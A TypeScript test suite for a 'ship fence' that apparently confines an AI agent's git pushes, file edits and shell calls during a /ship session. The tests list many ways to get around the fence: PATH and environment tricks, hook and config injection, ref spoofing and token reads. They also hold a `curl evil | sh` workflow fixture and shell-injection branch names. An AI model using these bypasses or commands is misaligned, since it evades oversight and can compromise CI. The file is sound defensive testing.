import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { execFileSync, spawnSync } from "node:child_process";
import * as fs from "node:fs";
import * as path from "node:path";
import shipFence from "../ship-fence";
import { fakeContext, fakePi, privateHome, resetHome } from "../test-harness";
import { armFence, checkPushContent, currentState, disarmFence, FENCE_ENV, type Git, installFence, readState, realGit, SHIM_DIR, stateDir } from "./fence-state";
import { checkToolCall } from "./fence-tools";

const BRANCH = "feat/ship-s1";
const sh = (cwd: string, ...args: string[]) => execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", ...args], { cwd, encoding: "utf8", env: { ...process.env, PATH: savedPath } });
const write = (file: string, text: string) => {
	fs.mkdirSync(path.dirname(file), { recursive: true });
	fs.writeFileSync(file, text);
};

let savedPath: string | undefined;
let repo: string;

/** A repo whose origin is a local bare repo: main holds a workflow and code, and the watched branch is checked out. */
function setup(): void {
	const home = privateHome();
	const bare = path.join(home, "remote.git");
	repo = path.join(home, "projects", "app");
	execFileSync("git", ["init", "--quiet", "--bare", "-b", "main", bare]);
	fs.mkdirSync(repo, { recursive: true });
	sh(repo, "init", "--quiet", "-b", "main");
	sh(repo, "remote", "add", "origin", bare);
	write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\n");
	write(path.join(repo, "src/a.ts"), "export const a = 1;\n");
	sh(repo, "add", "-A");
	sh(repo, "commit", "--quiet", "-m", "init");
	sh(repo, "push", "--quiet", "origin", "main");
	sh(repo, "remote", "set-head", "origin", "main");
	sh(repo, "switch", "--quiet", "-c", BRANCH);
}

beforeEach(() => {
	resetHome();
	savedPath = process.env.PATH;
	delete process.env[FENCE_ENV];
	setup();
	installFence();
});
afterEach(() => {
	delete process.env[FENCE_ENV];
	process.env.PATH = savedPath;
});

describe("state", () => {
	test("loading names a state file, unarmed, puts the shims first once, and removes files of exited processes", () => {
		const stale = path.join(stateDir(), "999999.json");
		fs.writeFileSync(stale, "{}");
		delete process.env[FENCE_ENV];
		installFence();
		installFence();
		expect(fs.existsSync(stale)).toBe(false);
		expect(currentState().armed).toBe(false);
		const entries = (process.env.PATH ?? "").split(path.delimiter);
		expect(entries[0]).toBe(SHIM_DIR);
		expect(entries.filter(e => e === SHIM_DIR)).toHaveLength(1);
	});

	test("arming records the branch, the git folders and the protected files; disarming keeps the file, unarmed", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		const state = currentState();
		expect(state).toMatchObject({ armed: true, pushBranch: BRANCH, root: fs.realpathSync(repo) });
		expect(Object.keys(state.snapshot)).toEqual([".github/workflows/ci.yml"]);
		expect(state.gitDirs).toContain(fs.realpathSync(path.join(repo, ".git")));
		disarmFence();
		expect(currentState()).toMatchObject({ armed: false, pushBranch: null });
	});

	test("a missing state is unarmed; an unreadable one is armed and pushes nothing", () => {
		const bad = path.join(privateHome(), "bad.json");
		fs.writeFileSync(bad, "{");
		expect(readState(path.join(privateHome(), "missing.json")).armed).toBe(false);
		expect(readState(bad)).toMatchObject({ armed: true, pushBranch: null });
	});
});

describe("tool calls while armed", () => {
	const call = (toolName: string, input: Record<string, unknown>, cwd = repo) => checkToolCall(toolName, input, currentState(), cwd);
	beforeEach(() => armFence({ pushBranch: BRANCH, root: repo }));

	test("protected files are refused by any spelling: case, symlink, a URL-looking prefix, conflict://, the absolute name", () => {
		fs.symlinkSync(".github", path.join(repo, "ghlink"));
		fs.symlinkSync("src/a.ts", path.join(repo, "alias.ts"));
		for (const p of [".github/workflows/ci.yml", ".GITHUB/workflows/ci.yml", "ghlink/workflows/ci.yml", "x://../CLAUDE.md", "AGENTS.md", ".envrc", path.join(repo, ".github/x.yml"), "conflict://1"]) {
			expect(call("write", { path: p, content: "x" })).toContain("ship fence");
		}
		for (const p of ["src/a.ts", "alias.ts", ".env.example", "docs/github.md", path.join(privateHome(), "notes.md"), "local://plan.md"]) {
			expect(call("write", { path: p, content: "x" })).toBeNull();
		}
	});

	test("edit payloads that delete or rename into a protected file, and ast_edit over folders, patterns or lists that reach one", () => {
		expect(call("edit", { input: "*** Begin Patch\n*** Delete File: .github/workflows/ci.yml\n*** End Patch" })).toContain(".github/workflows/ci.yml");
		expect(call("edit", { path: "scratch.yml", rename: ".github/workflows/evil.yml", input: "x" })).toContain("evil.yml");
		expect(call("ast_edit", { paths: [repo] })).toContain("holds files /ship never edits");
		expect(call("ast_edit", { paths: [".github"] })).toContain(".github");
		expect(call("ast_edit", { paths: ["**/*.yml"] })).toContain("not a pattern");
		expect(call("ast_edit", { paths: "src/a.ts;lefthook.yml" })).toContain("lefthook.yml");
		expect(call("ast_edit", { paths: ["src"] })).toBeNull();
	});

	test("a linked worktree's hooks live in the main repo's git folder, and they are refused too", () => {
		const wt = path.join(privateHome(), "projects", "app-wt");
		sh(repo, "worktree", "add", "--quiet", "-b", "feat/wt", wt);
		armFence({ pushBranch: "feat/wt", root: wt });
		for (const p of [path.join(repo, ".git/hooks/pre-push"), "../app/.git/config", ".git"]) expect(call("write", { path: p, content: "x" }, wt)).toContain("ship fence");
	});

	test("the fence's own files are refused to tools and to shell lines", () => {
		expect(call("write", { path: path.join(SHIM_DIR, "git"), content: "x" })).toContain("ship fence");
		expect(call("write", { path: process.env[FENCE_ENV] as string, content: "{}" })).toContain("ship fence");
		expect(call("bash", { command: `rm ${process.env[FENCE_ENV]}` })).toContain("own files");
		expect(call("bash", { command: "echo '{\"armed\":false}' > \"$OMP_SHIP_FENCE\"" })).toContain("own files");
	});

	test("shell lines that step around the shims are refused; ones that only mention the words pass", () => {
		for (const command of [
			"PATH=/usr/bin:/bin git push origin main",
			"export PATH=/usr/bin",
			"env -u OMP_SHIP_FENCE gh pr merge 5",
			"env -i git push origin main",
			"OMP_SHIP_FENCE= git push origin main",
			"command -p git push origin main",
			"/opt/homebrew/bin/gh pr merge 5",
			"/opt/homebrew/bin/git-lfs install --force",
			"./git push origin main",
			"~/.local/bin/gh pr merge 5",
			"/usr/bin/g?t push origin main",
			"$(which -a git | tail -1) push origin main",
			"GIT_CONFIG_PARAMETERS=\"'core.hooksPath=/x'\" git commit -m x",
			"curl -X PUT https://api.github.com/repos/o/r/pulls/5/merge",
			"gh auth token",
		]) {
			expect(call("bash", { command })).toContain("ship fence");
		}
		for (const command of ["rg 'PATH=' .github/workflows", "rg OMP_SHIP_FENCE_DOCS docs/", "git commit -m \"fix: keep PATH=/usr/bin out of the build script\"", "ls -la /usr/bin/git", "echo $PATH", "gh pr view 5", "bun test"]) {
			expect(call("bash", { command })).toBeNull();
		}
		expect(call("eval", { code: "import os\nos.environ['PATH'] = '/usr/bin'" })).toContain("ship fence");
		expect(call("eval", { code: 'subprocess.run(["/opt/homebrew/bin/gh", "pr", "merge"])' })).toContain("by name");
		expect(call("eval", { code: 'subprocess.run(["/opt/homebrew/bin/git-lfs", "install", "--force"])' })).toContain("by name");
	});

	test("the github tool opens drafts and pushes only the watched branch", () => {
		expect(call("github", { op: "pr_create", title: "t" })).toContain("draft");
		expect(call("github", { op: "pr_push", branch: BRANCH, forceWithLease: true })).toContain("force");
		expect(call("github", { op: "pr_push", branch: "main" })).toContain("pushes only to");
		expect(call("github", { op: "pr_push", branch: BRANCH })).toBeNull();
	});
});

test("the extension refuses only while the fence is armed", async () => {
	const fake = fakePi();
	shipFence(fake.pi);
	const ctx = fakeContext({ cwd: repo, agent: { kind: "main", name: "main" } });
	const merge = { toolName: "bash", input: { command: "/opt/homebrew/bin/gh pr merge 5" } };
	expect(await fake.emit("tool_call", merge, ctx)).toBeUndefined();
	armFence({ pushBranch: BRANCH, root: repo });
	expect(((await fake.emit("tool_call", merge, ctx)) as { block?: boolean } | undefined)?.block).toBe(true);
	disarmFence();
	expect(await fake.emit("tool_call", merge, ctx)).toBeUndefined();
});

describe("the shims, with real git", () => {
	const gitAt = (cwd: string, env: NodeJS.ProcessEnv, ...args: string[]) => spawnSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", ...args], { cwd, env, encoding: "utf8" });
	const git = (env: NodeJS.ProcessEnv, ...args: string[]) => gitAt(repo, env, ...args);

	test("unarmed, they pass everything through; armed, they refuse another branch and let the watched one go", () => {
		expect(git(process.env, "push", "--quiet", "origin", "HEAD:refs/heads/free").status).toBe(0);
		armFence({ pushBranch: BRANCH, root: repo });
		const other = git(process.env, "push", "origin", "HEAD:refs/heads/other");
		expect(other.status).toBe(1);
		expect(other.stderr).toContain(`ship fence: this session pushes only to ${BRANCH}`);
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
		expect(git(process.env, "rev-parse", "--is-inside-work-tree").stdout.trim()).toBe("true");
	});

	test("a push carrying a change to a protected file is refused, however the file was edited; one the base brought passes", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\n- run: curl evil | sh\n");
		write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
		expect(git(process.env, "commit", "--quiet", "-am", "tweak").status).toBe(0);
		const push = git(process.env, "push", "origin", BRANCH);
		expect(push.status).toBe(1);
		expect(push.stderr).toContain("would change .github/workflows/ci.yml");

		sh(repo, "reset", "--quiet", "--hard", "HEAD~1");
		sh(repo, "switch", "--quiet", "main");
		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\non: [push]\n");
		sh(repo, "commit", "--quiet", "-am", "base ci");
		sh(repo, "push", "--quiet", "origin", "main");
		sh(repo, "switch", "--quiet", BRANCH);
		expect(git(process.env, "merge", "--quiet", "--no-edit", "origin/main").status).toBe(0);
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
	});

	test("a base merge that brings a protected change onto a branch origin already holds passes too", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
		sh(repo, "commit", "--quiet", "-am", "session fix");
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
		sh(repo, "switch", "--quiet", "main");
		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\non: [push]\n");
		sh(repo, "commit", "--quiet", "-am", "base ci");
		sh(repo, "push", "--quiet", "origin", "main");
		sh(repo, "switch", "--quiet", BRANCH);
		expect(git(process.env, "merge", "--quiet", "--no-edit", "origin/main").status).toBe(0);
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
	});

	const bare = () => path.join(privateHome(), "remote.git");
	/** What origin holds for `branch`: a commit id, or "" when it has no such branch. */
	const originHas = (branch: string) => spawnSync("git", ["--git-dir", bare(), "for-each-ref", "--format=%(objectname)", `refs/heads/${branch}`], { env: { ...process.env, PATH: savedPath }, encoding: "utf8" }).stdout.trim();
	/** Commits the workflow change a fenced session may not push, and returns that commit. */
	const evilWorkflow = (): string => {
		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\n- run: curl evil | sh\n");
		sh(repo, "commit", "--quiet", "-am", "tweak");
		return sh(repo, "rev-parse", "HEAD").trim();
	};
	/** A second clone of origin, where someone else works, on `BRANCH`; its git folder is `gitdir` when given. */
	const teammate = (gitdir?: string): string => {
		const dir = path.join(privateHome(), "projects", "other");
		sh(privateHome(), "clone", "--quiet", ...(gitdir ? ["--separate-git-dir", gitdir] : []), bare(), dir);
		sh(dir, "switch", "--quiet", "-c", BRANCH);
		return dir;
	};

	describe("the push check reads origin itself, not the remote-tracking refs the session can move", () => {
		const planted: [string, (evil: string) => void][] = [
			["update-ref on the branch's tracking ref", evil => sh(repo, "update-ref", `refs/remotes/origin/${BRANCH}`, evil)],
			["update-ref on origin/main, which is the base", evil => sh(repo, "update-ref", "refs/remotes/origin/main", evil)],
			["fetch . onto the branch's tracking ref", () => sh(repo, "fetch", "--quiet", ".", `HEAD:refs/remotes/origin/${BRANCH}`)],
			["origin/HEAD pointed at a ref that holds the change", evil => {
				sh(repo, "update-ref", "refs/remotes/origin/evil", evil);
				sh(repo, "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/evil");
			}],
		];
		for (const [name, plant] of planted) {
			test(name, () => {
				armFence({ pushBranch: BRANCH, root: repo });
				plant(evilWorkflow());
				const push = git(process.env, "push", "origin", BRANCH);
				expect(push.status).toBe(1);
				expect(push.stderr).toContain("would change .github/workflows/ci.yml");
				expect(originHas(BRANCH)).toBe("");
			});
		}
	});

	test("update-ref and fetch . onto remote-tracking refs are refused by the shim, and the change stays off origin", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		const evil = evilWorkflow();
		for (const args of [["update-ref", `refs/remotes/origin/${BRANCH}`, evil], ["update-ref", "refs/remotes/origin/main", evil], ["fetch", ".", `HEAD:refs/remotes/origin/${BRANCH}`]]) {
			const r = git(process.env, ...args);
			expect(r.status).toBe(1);
			expect(r.stderr).toContain("ship fence");
		}
		expect(sh(repo, "for-each-ref", "--format=%(objectname)", "refs/remotes")).not.toContain(evil);
		expect(git(process.env, "push", "origin", BRANCH).status).toBe(1);
		expect(originHas(BRANCH)).toBe("");
	});

	test("a replacement ref does not show the push check another tree than the one the push sends", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		const benign = sh(repo, "rev-parse", "HEAD").trim();
		const evil = evilWorkflow();
		expect(git(process.env, "update-ref", `refs/replace/${evil}`, benign).status).toBe(1);
		sh(repo, "update-ref", `refs/replace/${evil}`, benign);
		const push = git(process.env, "push", "origin", BRANCH);
		expect(push.status).toBe(1);
		expect(push.stderr).toContain("would change .github/workflows/ci.yml");
		expect(originHas(BRANCH)).toBe("");
	});

	test("only origin's own branch counts as its tip: ls-remote also lists refs whose name merely ends the same way", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		const evil = evilWorkflow();
		// Someone else put the change on a branch named like the watched one's full ref name.
		sh(repo, "push", "--quiet", "origin", `${evil}:refs/heads/refs/heads/${BRANCH}`);
		const push = git(process.env, "push", "origin", BRANCH);
		expect(push.status).toBe(1);
		expect(push.stderr).toContain("would change .github/workflows/ci.yml");
		expect(originHas(BRANCH)).toBe("");
	});

	test("moving a protected file away is a change to it", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		fs.mkdirSync(path.join(repo, "docs"));
		sh(repo, "mv", ".github/workflows/ci.yml", "docs/ci.yml");
		sh(repo, "commit", "--quiet", "-m", "move the workflow");
		const push = git(process.env, "push", "origin", BRANCH);
		expect(push.status).toBe(1);
		expect(push.stderr).toContain("would change .github/workflows/ci.yml");
		expect(originHas(BRANCH)).toBe("");
	});

	test("git that writes where it is told does not write into the git folder, however it is reached", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		const hooks = path.join(repo, ".git", "hooks");
		const template = path.join(privateHome(), "template");
		write(path.join(template, "hooks", "pre-commit"), "#!/bin/sh\nexit 0\n");
		fs.chmodSync(path.join(template, "hooks", "pre-commit"), 0o755);
		fs.symlinkSync(".git/hooks", path.join(repo, "hk"));
		for (const args of [
			["diff", "--output=.git/hooks/pre-commit"],
			["archive", "-o", ".git/hooks/pre-commit", "HEAD"],
			["checkout-index", "--prefix=.git/hooks/", "-a"],
			["bundle", "create", ".git/hooks/pre-commit", "HEAD"],
			["init", `--template=${template}`],
			// Running init again copies the templates in, however they are named.
			["init"],
			["-c", `init.templateDir=${template}`, "init"],
			["-C", "src", "archive", "-o", "../.git/hooks/pre-commit", "HEAD"],
			["archive", "-o", path.join(hooks, "pre-commit"), "HEAD"],
			["archive", "-o", "hk/pre-commit", "HEAD"],
			["--work-tree=.git/hooks", "checkout", "HEAD", "--", "src/a.ts"],
			// A `..` after a symlink leaves the link's target, so these reach .git itself.
			["checkout-index", "--prefix=hk/../", "-f", "src/a.ts"],
			["-C", "hk/..", "archive", "-o", "config", "HEAD"],
			// Commands that create or fill a file at a path they are given; a long option by a prefix, a short one in a bundle, an option given twice.
			["mailinfo", ".git/hooks/pre-commit", "/dev/null"],
			["mv", "src/a.ts", ".git/hooks/pre-commit"],
			["clone", bare(), ".git/hooks/clone"],
			["config", "--file", ".git/hooks/pre-push", "core.x", "y"],
			["format-patch", "--output-directory=.git/hooks", "-1"],
			["checkout-index", "--pre=.git/hooks/", "-a"],
			["archive", "-qo.git/hooks/pre-commit", "HEAD"],
			["diff", `--output=${path.join(privateHome(), "d.patch")}`, "--output=.git/hooks/pre-commit"],
		]) {
			const r = git(process.env, ...args);
			expect(r.status).toBe(1);
			expect(r.stderr).toContain("ship fence");
		}
		const viaEnv = git({ ...process.env, GIT_TEMPLATE_DIR: template }, "init");
		expect(viaEnv.status).toBe(1);
		expect(viaEnv.stderr).toContain("ship fence");
		// A fresh folder is none of the fence's business.
		expect(git(process.env, "init", "--quiet", path.join(privateHome(), "fresh")).status).toBe(0);
		const inside = spawnSync("git", ["archive", "-o", "pre-commit", "HEAD"], { cwd: hooks, env: process.env, encoding: "utf8" });
		expect(inside.status).toBe(1);
		expect(fs.readdirSync(hooks).filter(name => !name.endsWith(".sample"))).toEqual([]);
		expect(fs.existsSync(path.join(repo, ".git", "src"))).toBe(false);
		expect(sh(repo, "config", "--get", "remote.origin.url")).toContain("remote.git");
	});

	test("commands that only mention .git in a pattern or a message run while armed", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		write(path.join(repo, "docs.md"), "see .git/hooks\n");
		sh(repo, "add", "-A");
		for (const args of [
			["grep", "-n", ".git/hooks"],
			["log", "-S.git", "--oneline"],
			["log", "--grep=/.git/", "--oneline"],
			["commit", "-q", "-m", "…/.git/…"],
			["commit", "-q", "--allow-empty", "-am", "docs: why /.git/ stays out of the tree"],
			["rev-parse", "--git-path", "hooks/pre-commit"],
		]) {
			const r = git(process.env, ...args);
			expect(r.stderr, args.join(" ")).not.toContain("ship fence");
			expect(r.status, args.join(" ")).toBe(0);
		}
	});

	test("a push run against another repo with --git-dir is refused, so the check always reads the repo that pushes", () => {
		const gitdir = path.join(privateHome(), "other-gd");
		const other = teammate(gitdir);
		write(path.join(other, ".github/workflows/ci.yml"), "name: CI\n- run: curl evil | sh\n");
		sh(other, "commit", "--quiet", "-am", "tweak");
		armFence({ pushBranch: BRANCH, root: repo });
		const push = git(process.env, "--git-dir", gitdir, "push", "origin", BRANCH);
		expect(push.status).toBe(1);
		expect(push.stderr).toContain("--git-dir");
		expect(originHas(BRANCH)).toBe("");
	});

	/** What a refusal tells the session to run, `run git <args>;`, as an argv for git. */
	const namedFetch = (stderr: string): string[] => {
		const command = /run git (fetch origin [^;]+);/.exec(stderr)?.[1];
		expect(command, stderr).toBeDefined();
		return (command as string).split(" ");
	};

	test("a push waits for the fetch it names while origin holds a commit this checkout lacks; then it goes", () => {
		const other = teammate();
		write(path.join(other, "src/b.ts"), "export const b = 1;\n");
		sh(other, "add", "-A");
		sh(other, "commit", "--quiet", "-m", "teammate");
		sh(other, "push", "--quiet", "origin", BRANCH);
		armFence({ pushBranch: BRANCH, root: repo });
		write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
		sh(repo, "commit", "--quiet", "-am", "mine");
		const blocked = git(process.env, "push", "origin", BRANCH);
		expect(blocked.status).toBe(1);
		expect(blocked.stderr).toContain(`run git fetch origin ${BRANCH};`);
		expect(blocked.stderr).not.toContain("This is final");
		expect(git(process.env, ...namedFetch(blocked.stderr)).status).toBe(0);
		expect(git(process.env, "merge", "--quiet", "--no-edit", `origin/${BRANCH}`).status).toBe(0);
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);

		write(path.join(other, "README.md"), "base moved\n");
		sh(other, "add", "-A");
		sh(other, "commit", "--quiet", "-m", "base moves");
		sh(other, "push", "--quiet", "origin", "HEAD:refs/heads/main");
		write(path.join(repo, "src/a.ts"), "export const a = 3;\n");
		sh(repo, "commit", "--quiet", "-am", "mine again");
		const behind = git(process.env, "push", "origin", BRANCH);
		expect(behind.stderr).toContain("run git fetch origin main;");
		expect(git(process.env, ...namedFetch(behind.stderr)).status).toBe(0);
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
	});

	describe("a clone that holds only the watched branch lacks origin's default branch, which a plain `git fetch origin` never brings", () => {
		/**
		 * Origin's main moves on after the branch left it; the clone then takes the branch alone, as `git clone --single-branch --branch`
		 * or `--depth 1` does. --no-local makes it fetch like a remote clone instead of copying every object.
		 */
		function partialClone(...flags: string[]): { dir: string; other: string } {
			write(path.join(repo, "src/b.ts"), "export const b = 1;\n");
			sh(repo, "add", "-A");
			sh(repo, "commit", "--quiet", "-m", "branch work");
			sh(repo, "push", "--quiet", "origin", BRANCH);
			const other = teammate();
			write(path.join(other, "README.md"), "base moved\n");
			sh(other, "add", "-A");
			sh(other, "commit", "--quiet", "-m", "base moves");
			sh(other, "push", "--quiet", "origin", "HEAD:refs/heads/main");
			const dir = path.join(privateHome(), "projects", "partial");
			sh(privateHome(), "clone", "--quiet", "--no-local", ...flags, "--branch", BRANCH, bare(), dir);
			expect(spawnSync("git", ["cat-file", "-e", `${sh(other, "rev-parse", "HEAD").trim()}^{commit}`], { cwd: dir }).status).not.toBe(0);
			return { dir, other };
		}

		for (const [name, flags] of [["single-branch", ["--single-branch"]], ["shallow", ["--depth", "1"]]] as const) {
			test(`${name}: the push names the fetch of the default branch, and goes after it`, () => {
				const { dir } = partialClone(...flags);
				armFence({ pushBranch: BRANCH, root: dir });
				write(path.join(dir, "src/a.ts"), "export const a = 2;\n");
				sh(dir, "commit", "--quiet", "-am", "mine");
				const blocked = gitAt(dir, process.env, "push", "origin", BRANCH);
				expect(blocked.status).toBe(1);
				expect(blocked.stderr).toContain("run git fetch origin main;");
				expect(blocked.stderr).not.toContain("This is final");
				// A plain fetch leaves it missing, which is why the refusal names the ref.
				expect(gitAt(dir, process.env, "fetch", "--quiet", "origin").status).toBe(0);
				expect(gitAt(dir, process.env, "push", "origin", BRANCH).stderr).toContain("run git fetch origin main;");
				expect(gitAt(dir, process.env, ...namedFetch(blocked.stderr)).status).toBe(0);
				expect(gitAt(dir, process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
				expect(originHas(BRANCH)).toBe(sh(dir, "rev-parse", "HEAD").trim());
			});
		}

		test("when the branch tip and the default branch are both missing, one fetch names both", () => {
			const { dir, other } = partialClone("--single-branch");
			sh(other, "fetch", "--quiet", "origin", BRANCH);
			sh(other, "reset", "--quiet", "--hard", `origin/${BRANCH}`);
			write(path.join(other, "src/c.ts"), "export const c = 1;\n");
			sh(other, "add", "-A");
			sh(other, "commit", "--quiet", "-m", "teammate");
			sh(other, "push", "--quiet", "origin", BRANCH);
			armFence({ pushBranch: BRANCH, root: dir });
			write(path.join(dir, "src/a.ts"), "export const a = 2;\n");
			sh(dir, "commit", "--quiet", "-am", "mine");
			const blocked = gitAt(dir, process.env, "push", "origin", BRANCH);
			expect(blocked.stderr).toContain(`run git fetch origin ${BRANCH} main;`);
			expect(gitAt(dir, process.env, ...namedFetch(blocked.stderr)).status).toBe(0);
			expect(gitAt(dir, process.env, "merge", "--quiet", "--no-edit", `origin/${BRANCH}`).status).toBe(0);
			expect(gitAt(dir, process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
		});
	});

	test("a protected change the branch held when /ship armed, or origin's branch already holds, is not the push's", () => {
		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\non: [pull_request]\n");
		sh(repo, "commit", "--quiet", "-am", "the user's own edit");
		armFence({ pushBranch: BRANCH, root: repo });
		write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
		sh(repo, "commit", "--quiet", "-am", "session fix");
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);

		const other = teammate();
		sh(other, "fetch", "--quiet", "origin", BRANCH);
		sh(other, "reset", "--quiet", "--hard", `origin/${BRANCH}`);
		write(path.join(other, ".github/workflows/ci.yml"), "name: CI\non: [push]\n");
		sh(other, "commit", "--quiet", "-am", "teammate edits the workflow");
		sh(other, "push", "--quiet", "origin", BRANCH);
		expect(git(process.env, "fetch", "--quiet", "origin").status).toBe(0);
		expect(git(process.env, "merge", "--quiet", "--no-edit", `origin/${BRANCH}`).status).toBe(0);
		write(path.join(repo, "src/a.ts"), "export const a = 3;\n");
		sh(repo, "commit", "--quiet", "-am", "session fix 2");
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
	});

	test("a push is refused, not waved through, when origin can't be read", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		const down: Git = (dir, ...args) => (args[0] === "ls-remote" ? { code: 128, out: "" } : realGit(dir, ...args));
		expect(checkPushContent(repo, [BRANCH], currentState(), down)).toContain("origin");
		expect(checkPushContent(repo, [BRANCH], { ...currentState(), pushBranch: null })).toContain("pushes nothing");
	});

	test("the fetch a refusal names comes from origin's own listing: its default branch by name, HEAD when none is named, a shell-safe word either way", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		const oid = "1".repeat(40);
		const origin = (listing: string): Git => (dir, ...args) => (args[0] === "ls-remote" ? { code: 0, out: listing } : args[0] === "cat-file" ? { code: 1, out: "" } : realGit(dir, ...args));
		const refuse = (listing: string) => checkPushContent(repo, [BRANCH], currentState(), origin(listing));
		expect(refuse(`ref: refs/heads/trunk\tHEAD\n${oid}\tHEAD\n`)).toContain("run git fetch origin trunk;");
		expect(refuse(`ref: refs/heads/trunk\tHEAD\n${oid}\tHEAD\n${"2".repeat(40)}\trefs/heads/${BRANCH}\n`)).toContain(`run git fetch origin ${BRANCH} trunk;`);
		expect(refuse(`${oid}\tHEAD\n`)).toContain("run git fetch origin HEAD;");
		expect(refuse(`ref: refs/heads/x;touch$IFS/tmp/p\tHEAD\n${oid}\tHEAD\n`)).toContain("run git fetch origin 'x;touch$IFS/tmp/p';");
		// A name that opens with `-` would be an option to fetch: it goes in full.
		expect(refuse(`ref: refs/heads/-x\tHEAD\n${oid}\tHEAD\n`)).toContain("run git fetch origin refs/heads/-x;");
		expect(refuse(`ref: refs/heads/--upload-pack=sh\tHEAD\n${oid}\tHEAD\n`)).toContain("run git fetch origin 'refs/heads/--upload-pack=sh';");
		expect(refuse(`ref: refs/heads/trunk\tHEAD\n${oid}\tHEAD\n`)).not.toContain("This is final");
	});

	test("a call whose environment lost the state name is refused", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		const env = { ...process.env };
		delete env[FENCE_ENV];
		const r = git(env, "status");
		expect(r.status).toBe(1);
		expect(r.stderr).toContain(`${FENCE_ENV} was removed`);
	});

	describe("config, helper programs, patches and hooks that would step around the fence", () => {
		/** A stand-in program: appends its name and argv to ran.log, then runs `after`. A line in the log is proof that git ran it. */
		const RAN_LOG = path.join(privateHome(), "ran.log");
		const stand = (file: string, after = ""): string => {
			write(file, `#!/bin/sh\necho "${path.basename(file)} $*" >> ${RAN_LOG}\n${after}\nexit 0\n`);
			fs.chmodSync(file, 0o755);
			return file;
		};
		const ran = (): string[] => (fs.existsSync(RAN_LOG) ? fs.readFileSync(RAN_LOG, "utf8").trim().split("\n") : []);
		/** Runs git and collects what the fence let through, so a failing run lists every hole at once. */
		const holes: string[] = [];
		const refuse = (env: NodeJS.ProcessEnv, cwd: string, ...args: string[]): void => {
			const r = gitAt(cwd, env, ...args);
			if (r.status !== 1 || !r.stderr.includes("ship fence")) holes.push(`git ${args.join(" ")} => ${r.status}: ${r.stderr.trim().split("\n")[0]}`);
		};
		beforeEach(() => {
			holes.length = 0;
		});

		test("config that runs a program or reads more config is refused however it is set, and nothing runs", () => {
			armFence({ pushBranch: BRANCH, root: repo });
			const home = privateHome();
			const prog = stand(path.join(home, "bin", "prog"));
			const include = path.join(home, "inc.cfg");
			write(include, `[core]\n\tfsmonitor = ${prog}\n`);
			const exec = path.join(home, "xp");
			stand(path.join(exec, "git-upload-pack"));
			const viaEnv = { ...process.env, PROG: prog };
			refuse(process.env, repo, "-c", `core.fsmonitor=${prog}`, "status");
			refuse(viaEnv, repo, "--config-env=core.fsmonitor=PROG", "status");
			refuse(viaEnv, repo, "--config-env", "core.fsmonitor=PROG", "status");
			refuse(process.env, repo, "-c", `core.editor=${prog}`, "commit", "--allow-empty");
			refuse(process.env, repo, "-c", `gpg.program=${prog}`, "-c", "user.signingkey=k", "commit", "--allow-empty", "-S", "-m", "x");
			refuse(process.env, repo, "-c", `include.path=${include}`, "config", "--get", "core.fsmonitor");
			refuse(process.env, repo, "-c", "protocol.ext.allow=always", "clone", `ext::sh -c touch% ${home}/ext-ran`, path.join(home, "cloned"));
			refuse(process.env, repo, "-c", `credential.helper=${prog}`, "fetch", "origin");
			refuse(process.env, repo, "config", "core.fsmonitor", prog);
			refuse(process.env, repo, "config", "--typ", "path", "core.fsmonitor", prog);
			refuse(process.env, repo, "config", "--add", "include.path", include);
			refuse(process.env, repo, "config", "--global", "core.pager", prog);
			refuse(process.env, repo, "config", "diff.x.textconv", prog);
			refuse(process.env, repo, "config", "filter.x.clean", prog);
			refuse(process.env, repo, "config", "gpg.program", prog);
			refuse({ ...process.env, GIT_EDITOR: prog }, repo, "config", "--edit");
			// A harmless key's section renamed over a risky one would carry its keys along.
			expect(gitAt(repo, process.env, "config", "foo.fsmonitor", prog).status).toBe(0);
			refuse(process.env, repo, "config", "--rename-section", "foo", "core");
			refuse(process.env, repo, `--exec-path=${exec}`, "fetch", "origin");
			refuse({ ...process.env, GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: "core.fsmonitor", GIT_CONFIG_VALUE_0: prog }, repo, "status");
			refuse({ ...process.env, GIT_CONFIG_PARAMETERS: `'core.fsmonitor'='${prog}'` }, repo, "status");
			expect(holes).toEqual([]);
			expect(ran()).toEqual([]);
			expect(fs.existsSync(path.join(home, "ext-ran"))).toBe(false);
			const kept = spawnSync("git", ["config", "--get-regexp", "^(include|core\\.(fsmonitor|pager|editor)|diff|filter|gpg)\\."], { cwd: repo, env: { ...process.env, PATH: savedPath }, encoding: "utf8" });
			expect(kept.stdout.trim()).toBe("");
			expect(kept.status).toBe(1);
